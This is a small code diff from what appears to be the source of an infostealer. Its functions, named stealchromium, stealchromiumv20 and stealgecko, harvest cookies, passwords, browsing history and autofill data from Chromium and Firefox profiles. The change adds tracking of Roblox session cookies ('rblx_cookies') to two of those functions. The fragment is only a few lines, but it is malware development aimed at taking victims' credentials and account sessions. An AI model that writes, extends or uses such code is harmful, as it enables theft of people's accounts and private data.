@@ -828,6 +828,7 @@ def stealchromium():
 def stealchromiumv20():
     global cookie_count
     global password_count
+    global rblx_cookies
 
     if config.browsers:
         chromium_paths = {
@@ -920,6 +921,7 @@ def stealgecko():
     global password_count
     global browsing_history
     global autofill_count
+    global rblx_cookies
     if config.browsers:
         gecko_paths = {
             "Firefox": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Mozilla Firefox\\nss3.dll"},
